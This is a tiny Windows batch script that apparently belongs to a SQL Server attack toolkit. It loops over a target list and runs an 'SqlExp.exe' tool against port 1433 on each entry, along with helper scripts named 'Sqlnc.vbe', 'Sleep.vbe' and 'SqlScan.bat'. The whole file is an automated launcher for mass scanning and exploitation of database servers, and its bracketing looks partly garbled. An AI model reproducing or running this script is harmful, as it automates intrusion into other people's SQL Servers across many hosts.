@echo off
@for /f "eol=; tokens=1,2" %%i in (%1) do @(Sqlnc.vbe && SqlExp.exe %%i 1433 :) 53 && Sleep.vbe)
@SqlScan.bat